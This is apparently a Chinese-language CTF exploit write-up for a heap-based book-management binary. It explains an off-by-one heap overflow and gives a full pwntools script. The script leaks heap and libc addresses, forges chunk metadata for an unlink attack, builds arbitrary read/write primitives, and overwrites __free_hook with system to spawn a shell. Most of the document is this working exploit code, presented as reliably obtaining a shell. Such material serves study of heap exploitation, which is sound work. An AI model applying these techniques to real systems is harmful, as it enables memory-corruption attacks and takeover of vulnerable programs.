# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的运行环境如下：
- **文件类型**：ELF 64位可执行文件，动态链接
- **安全机制**（通过checksec推断）：
  - PIE：启用（地址随机化）
  - RELRO：Full RELRO（GOT表只读）
  - NX：启用（堆栈不可执行）
  - Stack Canary：禁用
- **依赖库**：通过ldd推断依赖标准libc库
- **运行要求**：需要在类Unix系统上运行，依赖libc版本与exp中使用的匹配

## 漏洞成因
### 关键结构体分析
程序管理图书库，关键结构体为图书结构体（在堆上分配），大致布局如下：
```c
struct book {
    int id;                    // 偏移0x00: 图书ID
    char *name;                // 偏移0x08: 名称指针
    char *description;         // 偏移0x10: 描述指针
    int description_size;      // 偏移0x18: 描述大小
};
```
全局变量：
- `book_pointers`：指针数组，指向各个图书结构体
- `author_name`：固定大小的作者名称缓冲区（32字节）

### 漏洞分析
漏洞主要源于`edit_book`函数中的堆溢出：
- 在`edit_book`中，调用`readline`读取新描述时，使用存储的描述大小减1作为大小参数（`*(_DWORD *)(*((_QWORD *)book_pointers + i) + 24LL) - 1`）。
- `readline`函数存在off-by-one错误：当读取达到指定大小时，会在当前位置写入null字节，但如果缓冲区大小正好等于指定大小，null字节会写入缓冲区之外，导致堆溢出。
- 结合堆布局，通过精心构造的图书描述大小和输入数据，可以溢出到相邻chunk，覆盖chunk元数据（如size、fd/bk指针），为unlink攻击创造条件。

漏洞类型：**堆溢出**导致任意地址读写。

## 漏洞利用过程
利用过程通过堆溢出和unlink攻击实现任意地址读写，最终覆盖`__free_hook`为`system`获取shell。以下表格总结了关键步骤的堆内存变化：

| 步骤 | 操作 | 堆内存关键变化 | 目的 |
|------|------|----------------|------|
| 1 | 设置author_name | author_name填充为'x'*27 + 'leak:'，用于后续泄露堆地址 | 准备信息泄露 |
| 2 | 创建图书1 | 分配图书结构体、名称和描述chunk，初始化堆布局 | 建立基础堆结构 |
| 3 | 创建图书2和3 | 分配额外chunk，丰富堆布局 | 为后续删除操作准备 |
| 4 | 删除图书2和3 | 释放的chunk进入fastbins，形成空闲链表 | 创建可重用的chunk |
| 5 | 创建图书4和5 | 图书4描述大小0x108（溢出源），图书5为目标chunk | 设置溢出环境 |
| 6 | 创建图书6 | 包含"/bin/sh"字符串，描述大小0x200 | 为任意读写和shell准备 |
| 7 | 编辑图书4 |  payload溢出到图书5的chunk，伪造chunk元数据（fd/bk指向特定位置） | 准备unlink攻击 |
| 8 | 删除图书5 | 触发unlink，覆盖book_pointers数组中的指针 | 获得任意读写能力 |
| 9 | 编辑图书4 | 修改指针指向堆中特定地址，设置任意读写原语 | 建立任意读写 |
| 10 | 读取libc地址 | 通过任意读泄露libc的main_arena地址，计算libc基址 | 定位system地址 |
| 11 | 写入__free_hook | 覆盖__free_hook为system地址 | 劫持控制流 |
| 12 | 删除图书6 | 触发free，实际执行system("/bin/sh") | 获取shell |

### 内存变化示意图（关键阶段）
```
初始堆布局：
[chunk1: book1][chunk2: book2][chunk3: book3]...

步骤4后：
[chunk1: book1][free chunk2][free chunk3]...

步骤5后：
[chunk1: book1][chunk4: overflow source][chunk5: target]...

步骤7溢出后：
[chunk1: book1][chunk4: fake metadata][chunk5: corrupted]...

步骤8 unlink后：
book_pointers数组被覆盖，指向可控地址
```

## Exploit
以下为漏洞利用脚本（exp），在关键位置添加注释：

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample27')
elf = ELF('./data/sample27')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)  # 发送数据而不换行，以触发溢出

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    # 任意写原语：通过编辑操作写入指定地址
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')
    edit(6, content + b'\n')

def read_at(addr):
    # 任意读原语：通过打印功能读取指定地址内容
    edit(4, p64(addr) + b'\n')
    cmd(4)
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

# 步骤1: 通过author_name泄露堆地址
p.recvuntil(b'name: ')
p.sendline(b'x' * (0x20 - 5) + b'leak:')  # 填充author_name，为泄露做准备
create(0x20, b'tmp a', 0x20, b'b')  # 创建初始图书，稳定堆布局

# 步骤2: 泄露堆基址
cmd(4)
p.recvuntil(b'Author: ')
p.recvuntil(b'leak:')
heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
heap_base = heap_leak - 0x1080  # 计算堆基址
log.info(f"Heap base: {hex(heap_base)}")

# 步骤3: 创建额外图书
create(0x20, b'buf 1', 0x20, b'desc buf')
create(0x20, b'buf 2', 0x20, b'desc buf 2')

# 步骤4: 删除图书，创建fastbins
remove(2)
remove(3)

# 步骤5: 创建用于溢出的图书
create(0x20, b'name', 0x108, b'overflow')  # 图书4，描述大小0x108用于溢出
create(0x20, b'name', 0x100 - 0x10, b'target')  # 图书5，目标chunk

# 步骤6: 创建包含"/bin/sh"的图书
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write')  # 图书6，用于后续触发shell

# 步骤7: 堆溢出，伪造chunk元数据
ptr = heap_base + 0x1180
# 构造payload：伪造chunk头部和fd/bk指针，指向book_pointers附近
payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100)
edit(4, payload)  # 溢出到图书5的chunk

# 步骤8: 触发unlink攻击
remove(5)  # 删除图书5，触发unlink，覆盖book_pointers

# 步骤9: 设置任意读写原语
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')

# 步骤10: 泄露libc地址
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_leak  # 计算libc基址
log.info(f"Libc base: {hex(libc.address)}")

# 步骤11: 覆盖__free_hook为system
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)

# 步骤12: 触发shell
remove(6)  # 释放图书6，触发system("/bin/sh")

p.interactive()  # 进入交互式shell
```

### 关键注释说明
- **信息泄露**：通过author_name缓冲区溢出泄露堆地址，计算堆基址。
- **堆布局**：通过创建和删除图书控制堆结构，为溢出和unlink做准备。
- **堆溢出**：利用edit功能中的off-by-one错误，覆盖相邻chunk元数据。
- **Unlink攻击**：通过伪造chunk的fd/bk指针，在free时触发unlink，覆盖book_pointers实现任意读写。
- **任意读写**：利用被覆盖的指针，实现任意地址读和写。
- **GetShell**：覆盖__free_hook为system，释放包含"/bin/sh"的chunk触发shell。

此exp在描述的环境下可稳定获取shell。
